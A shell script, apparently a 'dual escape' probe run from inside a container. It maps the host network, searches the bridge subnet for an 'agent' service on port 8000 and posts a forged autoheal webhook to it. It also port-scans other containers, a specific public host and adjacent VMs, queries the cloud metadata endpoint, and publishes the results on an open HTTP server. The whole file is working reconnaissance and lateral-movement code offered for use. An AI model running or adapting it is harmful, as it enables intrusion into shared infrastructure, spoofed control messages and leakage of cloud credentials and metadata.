#!/bin/sh
echo "=== v8: docker0 macvlan + eth0 ipvlan dual escape ===" > /app/index.html
echo "Time: $(date -u +%Y-%m-%dT%H:%M:%SZ)" >> /app/index.html
echo "" >> /app/index.html

echo "=== INTERFACES ===" >> /app/index.html
ip -4 addr show >> /app/index.html 2>&1
echo "" >> /app/index.html

echo "=== ROUTES ===" >> /app/index.html
ip route show >> /app/index.html 2>&1
echo "" >> /app/index.html

echo "=== NEIGHBORS ===" >> /app/index.html
ip neigh show >> /app/index.html 2>&1
echo "" >> /app/index.html

echo "=== AGENT HUNT: 172.18.0.x:8000 (curl) ===" >> /app/index.html
for i in $(seq 1 30); do
  RESULT=$(curl -s -m 2 -o /dev/null -w "%{http_code}" "http://172.18.0.$i:8000/health" 2>/dev/null)
  if [ "$RESULT" != "000" ]; then
    echo "*** AGENT FOUND: 172.18.0.$i:8000/health → HTTP $RESULT ***" >> /app/index.html
    curl -sv -m 3 "http://172.18.0.$i:8000/health" >> /app/index.html 2>&1
    echo "" >> /app/index.html
    echo "--- WEBHOOK from compose container ---" >> /app/index.html
    curl -sv -m 3 -X POST "http://172.18.0.$i:8000/webhooks/autoheal" \
      -H "Content-Type: application/json" \
      -d '{"content":"Container ipvlan-compose-probe_00000000-0000-0000-0000-000000000000 (unhealthy) restarted"}' >> /app/index.html 2>&1
    echo "" >> /app/index.html
    echo "--- ALL ENDPOINTS ---" >> /app/index.html
    for ep in "/" "/health" "/docs" "/openapi.json" "/redoc"; do
      R=$(curl -s -m 2 -o /dev/null -w "%{http_code}" "http://172.18.0.$i:8000${ep}")
      echo "  ${ep} → HTTP $R" >> /app/index.html
    done
    echo "" >> /app/index.html
  fi
done

echo "=== AGENT HUNT: hostname resolve ===" >> /app/index.html
getent hosts agent >> /app/index.html 2>&1
echo "" >> /app/index.html

echo "=== PORT SCAN: 172.18.0.x (all bridge containers) ===" >> /app/index.html
for i in $(seq 1 30); do
  for port in 22 80 443 2375 5672 8000 8080 9100 9200 15672; do
    nc -z -w1 172.18.0.$i $port 2>/dev/null && echo "172.18.0.$i:$port OPEN" >> /app/index.html
  done
done
echo "" >> /app/index.html

echo "=== HOST FULL PORT SCAN (45.89.190.124) ===" >> /app/index.html
for port in 21 22 25 53 80 111 443 873 2049 2375 2376 3306 4243 5432 5672 6379 8000 8080 8443 9090 9100 9200 10250 15672 27017; do
  nc -z -w1 45.89.190.124 $port 2>/dev/null && echo "45.89.190.124:$port OPEN" >> /app/index.html
done
echo "" >> /app/index.html

echo "=== ADJACENT VMs: 45.89.190.x ===" >> /app/index.html
for i in 1 2 100 120 121 122 123 124 125 126 127 128 200 254; do
  for port in 22 80 443; do
    nc -z -w1 45.89.190.$i $port 2>/dev/null && echo "45.89.190.$i:$port OPEN" >> /app/index.html
  done
done
echo "" >> /app/index.html

echo "=== METADATA ===" >> /app/index.html
curl -s -m 3 "http://169.254.169.254/latest/meta-data/" >> /app/index.html 2>&1
echo "" >> /app/index.html
curl -s -m 3 "http://169.254.169.254/" >> /app/index.html 2>&1
echo "" >> /app/index.html

echo "=== done $(date -u +%Y-%m-%dT%H:%M:%SZ) ===" >> /app/index.html
cd /app && python3 -m http.server 8080
